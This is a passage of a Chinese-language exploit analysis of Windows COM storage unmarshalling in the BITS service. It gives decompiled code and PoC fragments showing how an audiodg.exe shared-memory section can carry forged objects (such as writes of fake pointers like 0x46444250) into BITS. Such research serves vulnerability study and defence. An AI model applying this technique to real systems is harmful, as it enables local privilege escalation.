            {
              if ( SDfMarshalPacketCurrent.CBasedDFBasisObj._SelftobjectPtr )
                //  BasedDFBasisObj同样是反序列出来之后但是不赋值,可以为nullptr最为最终结果的构造函数参数传入
                CBasedDFBasisObj = (CDFBasis *)(SDfMarshalPacketCurrent.CBasedDFBasisObj._SelftobjectPtr
                                              + *(_DWORD *)NtCurrentTeb()->ReservedForOle);
              else
                CBasedDFBasisObj = 0;
              if ( SDfMarshalPacketCurrent.CBasedPubDocFileObj._SelftobjectPtr )
                // PubDocFileObj同样是反序列出来之后但是不赋值,可以为nullptr最为最终结果的构造函数参数传入
                CBasedPubDocFileObjNext = (CPubDocFile *)(SDfMarshalPacketCurrent.CBasedPubDocFileObj._SelftobjectPtr
                                                        + *(_DWORD *)NtCurrentTeb()->ReservedForOle);
              else
                CBasedPubDocFileObjNext = 0;
              // !!!构造CExposedDocFileObjNext,它才是最终结果!!!
              CExposedDocFile::CExposedDocFile(
                CExposedDocFileObjNext,
                CBasedPubDocFileObjNext,
                CBasedDFBasisObj,
                CPerContextObj);
              // 最终结果就是刚才构造的CExposedDocFileObjNext
              CExposedDocFile_MarshalList_Final = CExposedDocFileObjNext;
            }
            else
            {
              CExposedDocFile_MarshalList_Final = 0;
            }
            // 如果构造出来的CExposedDocFile_MarshalList_Final 失败
            if ( !CExposedDocFile_MarshalList_Final )
              goto LABEL_54;
            if ( SDfMarshalPacketCurrent.CBasedMarshalListObj._SelftobjectPtr )
              CBasedMarshalListObj = SDfMarshalPacketCurrent.CBasedMarshalListObj._SelftobjectPtr
                                   + *(_DWORD *)NtCurrentTeb()->ReservedForOle;
            else
              CBasedMarshalListObj = 0;
            if ( CBasedMarshalListObj )
            {
              // 不是当前进程也需要反序列出来MarshalList把最终结果加进入
              if ( SDfMarshalPacketCurrent.CBasedMarshalListObj._SelftobjectPtr )
                CBasedMarshalListObjNext = (CMarshalList *)(SDfMarshalPacketCurrent.CBasedMarshalListObj._SelftobjectPtr
                                                          + *(_DWORD *)NtCurrentTeb()->ReservedForOle);
              else
                CBasedMarshalListObjNext = 0;
              // 通过最终结果的MarshalList字段加到全局也是反序列化出来的MarshalList
              CMarshalList::AddMarshal(CBasedMarshalListObjNext, &CExposedDocFile_MarshalList_Final->CMarshalListObj);
              // 最终结果是ExposedDoc
            }
            if ( SDfMarshalPacketCurrent.CBasedPubDocFileObj._SelftobjectPtr )
              // PubDocFile也反序列化出来因为2个doc有关联所以需要addref下PubDocFile
              CPubDocFileObjNext = (CPubDocFile *)(SDfMarshalPacketCurrent.CBasedPubDocFileObj._SelftobjectPtr
                                                 + *(_DWORD *)NtCurrentTeb()->ReservedForOle);
            else
              CPubDocFileObjNext = 0;
            InterlockedIncrement(&CPubDocFileObjNext->_count_References);
          }
          // 把CExposedDocFile_MarshalList_Final赋值给最终需要反序列化的远程对象指针ppv
          *ppv = CExposedDocFile_MarshalList_Final;
          CDfMutex::Release(&mtx);
          if ( pvBaseOld != ReservedForOleRef )
          {
            CPerContext::SetThreadAllocatorState(&pcSharedMemory, 0);
            CSmAllocator_C = GetTlsSmAllocator();
            CSmAllocator::Uninit(CSmAllocator_C);
          }
          CSmAllocator_D = GetTlsSmAllocator();
          CSmAllocator::SetState(CSmAllocator_D, 0, 0, 0, 0, 0);
          if ( pstorgeStd )
            pstorgeStd->_SelfStorageVtbl->Release(pstorgeStd);
          goto LABEL_80;
        }
    LABEL_54:
        hrFinal = -2147287032;
        CPerContext::Release(CPerContextObj);
        goto EH_mtx_0;
      }
    EH_std_0:
      if ( !pstorgeStd )
      {
        CPerContext::~CPerContext(&pcSharedMemory);
        CDfMutex::~CDfMutex(&mtx);
        return hrFinal;
      }
      *ppv = pstorgeStd;
    LABEL_80:
      CPerContext::~CPerContext(&pcSharedMemory);
      CDfMutex::~CDfMutex(&mtx);
      return 0;
    }
DfUnMarshalInterface默认是采用MSHCTX=MSHCTX_INPROC也就是同进程内Unmrahsl方式读取的指针都是的同进程对象,不过它也支持UnmarshalSharedMemory方式,也就是从结构的hMem字段从audiodg.exe的共享内存初始化相应的共享对象
    //SDfMarshalPacket结构
    typedef  struct _SDfMarshalPacket
    {
        unsigned int CBasedPubDocFileObj;
        void *  CBasedPubStreamObj;
        void *  CBasedSeekPointerObj;
        void *  CBasedMarshalListObj;
        void *  CBasedDFBasisObj;
        unsigned int CBasedGlobalContextObj;
        unsigned int CBasedGlobalFileStreamBaseObj;
        void *  CBasedGlobalFileStreamDirty;
        void *  CBasedGlobalFileStreamOriginal;
        unsigned int ulHeapName;
        unsigned int ProcessContextId;
        GUID cntxkey;
        CPerContext * CPerContextObj;
        //共享内存
        void *hMem;
    } SDfMarshalPacket;
[windows音频服务](https://docs.microsoft.com/en-us/windows/desktop/api/audioclient/nf-audioclient-iaudioclient-initialize)允许建立一个Initialize在audiodg.exe进程共享内存中AUDCLNT_SHAREMODE=AUDCLNT_SHAREMODE_SHARED的共享内存,并开辟这样一块共享内存给poc进程和bits进程使用.通过ntdll未公开的函数实现找到位于audiodg.exe进程共享内存的句柄,写入交换数据后,将共享内存的句柄值写入SDfMarshalPacket->hMem,关于[ntdll未公开的函数](http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtQuerySection.html)具体实现poc中有代码请读者自行研究.
    HRESULT STDMETHODCALLTYPE SharedMemoryMarshaller::StartAudioClient(){
            const CLSID CLSID_MMDeviceEnumerator = __uuidof(MMDeviceEnumerator);
            const IID IID_IMMDeviceEnumerator = __uuidof(IMMDeviceEnumerator);
            IMMDeviceEnumeratorPtr pEnumerator = nullptr;
            HRESULT hr = CoCreateInstance(
                CLSID_MMDeviceEnumerator, NULL,
                CLSCTX_ALL, IID_IMMDeviceEnumerator,
                (void**)&pEnumerator);
            IMMDevicePtr pDevice = nullptr;
            hr = pEnumerator->GetDefaultAudioEndpoint(EDataFlow::eRender, ERole::eConsole, &pDevice);
            WAVEFORMATEX *pwfx = NULL;
            REFERENCE_TIME hnsRequestedDuration = 10000000;
            UINT32 nFrames = 0;
            IAudioClient *pAudioClient = NULL;
            // Get the audio client.
            (hr = pDevice->Activate(
                __uuidof(IAudioClient),
                CLSCTX_INPROC_SERVER,
                NULL,
                (void**)&pAudioClient));
            // Get the device format.
            hr = pAudioClient->GetMixFormat(&pwfx);
            // Open the stream and associate it with an audio session.
            hr = pAudioClient->Initialize(
                AUDCLNT_SHAREMODE_SHARED,
                NULL,
                hnsRequestedDuration,
                0,
                pwfx,
                NULL);
            return hr;
        }
在CSharedMemoryBlock::InitUnMarshal中CSharedMemoryBlockObj->_pbBase被赋值成了SDfMarshalPacket->hMem共享内存映射后的地址,之后在CSmAllocator::Init中
CPerContext->_pbBase = CSharedMemoryBlockObj->_pbBase +
8,之后在UnmarshalSharedMemory接着就调用CPerContext::SetThreadAllocatorState接着调用CSmAllocator::SetState将NtCurrentTeb()->ReservedForOle赋值成CPerContext->_pbBase.最终得出的结论是NtCurrentTeb()->ReservedForOle-8就是共享内存内存映射的相对地址.在poc中使用如下方式操作共享内存
在poc中映射的共享内存基址directoryMappedAddressLocal就是bits进程中NtCurrentTeb()->ReservedForOle-8即bits进程映射的共享内存基址.以下是poc操作共享内存的方法
CBasedMapSectionPtr _pdf = (CBasedMapSectionPtr_ )(pck->CBasedPubDocFileObj +
(ULONG)directoryMappedAddressLocal + 8);
pdf->_SelftobjectPtr = 0x46444250;
    void __stdcall UnmarshalSharedMemory(SDfMarshalPacket *SDfMarshalPacketCurrent, unsigned int mshlflags, CPerContext *ppcOwner)
    {
      SDfMarshalPacket *pck; // esi
      unsigned int HeapName; // ebx
      CPerContext *CPerContextObjTemp; // eax
      HANDLE currentThreadHandle; // eax
      CPerContext *ppcOwnerRef; // ecx
      unsigned int ProcessContextIdRef; // [esp+Ch] [ebp-Ch]
      void *hToken; // [esp+10h] [ebp-8h]
      int sc; // [esp+14h] [ebp-4h]
      CSmAllocator *pMalloc; // [esp+20h] [ebp+8h]
      CSmAllocator *pMalloca; // [esp+20h] [ebp+8h]
      pck = SDfMarshalPacketCurrent;
      HeapName = SDfMarshalPacketCurrent->ulHeapName;
      // 获取当前进程pid
      ProcessContextIdRef = SDfMarshalPacketCurrent->ProcessContextId;
      // PerContextObj反序列出来如果是当前进程就取它的值
      CPerContextObjTemp = SDfMarshalPacketCurrent->CPerContextObj;
      sc = 0;
      //  pMalloc 就是CPerContextObjTemp的引用
      pMalloc = (CSmAllocator *)CPerContextObjTemp;
      if ( GetCurrentProcessId() == ProcessContextIdRef )
      {
        // CSmAllocatorObjRefThis就是去反序列化这和sharedmemeory没关系了,默认认为sharedmemeory已经存在并初始化
        ppcOwnerRef = (CPerContext *)pMalloc;
      }
      else
      {
        pMalloca = GetTlsSmAllocator();
        if ( pMalloca->_ulHeapName != HeapName )
        {
          hToken = 0;
          // 获取当前线程Thread的tid
          currentThreadHandle = GetCurrentThread();
          if ( OpenThreadToken(currentThreadHandle, 8u, 1, &hToken) )
          {
            CloseHandle(hToken);
            sc = 0x80030005;
            JUMPOUT(&requireCreateInstance);
          }
          // 非当前进程认为sharedmemeory不存在并开始初始化
          CSmAllocator::SetState(pMalloca, 0, 0, 0, 0, 0);
          // fUnmarshal=1,开始Unmarshal共享内存
          sc = CSmAllocator::Init(pMalloca, pck->hMem, ProcessContextIdRef, HeapName, 1);     
          sc = CSmAllocator::Sync(pMalloca);     
        }
        // owner就是pcSharedMemory如果非当前进程,CPerContext的pbBase又赋值给CSmAllocator的pbBase
        CPerContext::GetThreadAllocatorState(ppcOwner);
        ppcOwnerRef = ppcOwner;
      }
      // 设置一下状态
      CPerContext::SetThreadAllocatorState(ppcOwnerRef, 0); 
    }
    void __thiscall CSmAllocator::SetState(CSmAllocator *this, CSharedMemoryBlock *psmb, char *pbBase, unsigned int ulHeapName, CPerContext **ppcPrev, CPerContext *ppcOwner)
    {
      unsigned int v6; // eax
      // that->CSharedMemoryBlockObj(+0x4) = shmBlock;
      this->CSharedMemoryBlockObj = psmb;
      //   this->_pbBase(0x8偏移量) = pbBase;
      this->_pbBase = pbBase;
      if ( psmb )
        v6 = psmb->_culCommitSize - 8;
      else
        v6 = 0;
      this->_cbSize = v6;
      this->_ulHeapName = ulHeapName;
      *(_DWORD *)NtCurrentTeb()->ReservedForOle = pbBase;
      if ( ppcPrev )
        *ppcPrev = this->_ppcOwner;
      this->_ppcOwner = ppcOwner;
    }
    int __thiscall CSmAllocator::Init(CSmAllocator *this, void *hMem, unsigned int dwProcessId, unsigned int ulHeapName, int fUnmarshal)
    {
      CSharedMemoryBlock *shmBlock; // eax
      CSharedMemoryBlock *shmBlockRef; // edi
    ....
      shmBlock = (CSharedMemoryBlock *)operator new(0x18u);
      if ( shmBlock )
      {
        shmBlock->_hMem = 0;
        shmBlock->_pbBase = 0;
        shmBlock->_culCommitSize = 0;
        shmBlock->_culInitCommitSize = 0;
        shmBlock->_fCreated = 1;